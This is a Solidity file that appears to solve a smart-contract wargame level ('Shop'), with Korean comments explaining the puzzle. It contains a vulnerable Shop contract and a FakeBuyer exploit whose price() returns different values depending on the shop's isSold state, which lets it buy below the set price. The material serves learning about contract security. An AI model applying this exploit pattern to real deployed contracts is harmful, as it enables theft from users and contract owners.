// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuyer {
    // 구매자의 가격
  function price() external view returns (uint256);
}

contract Shop {
  uint256 public price = 100;
  // 판매 여부
  bool public isSold;

  function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

// 문제: shop의 price인 100보다 낮은 가격으로 가져올 수 있어야 함
// view 함수는 상태는 읽어들일 수 있으나, 변경은 할 수 없음.
// 즉 다른 컨트랙트의 상태를 참조할 수 있다 

// 해결: if 절이 true면 isSold를 true로 변경하고, price를 바꿈.
// 그럼 price가 if 절에서 한 번 호출될 때, price랑 같은 값을 반환하게 하고
// 그 다음 price 호출에서 isSold가 true이니 price를 0으로 반환.

contract FakeBuyer is IBuyer {
    Shop public shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function buy() external {
        shop.buy();
    }

    function price() external view returns(uint) {
        return shop.isSold() ? 0 : 100;
    }
}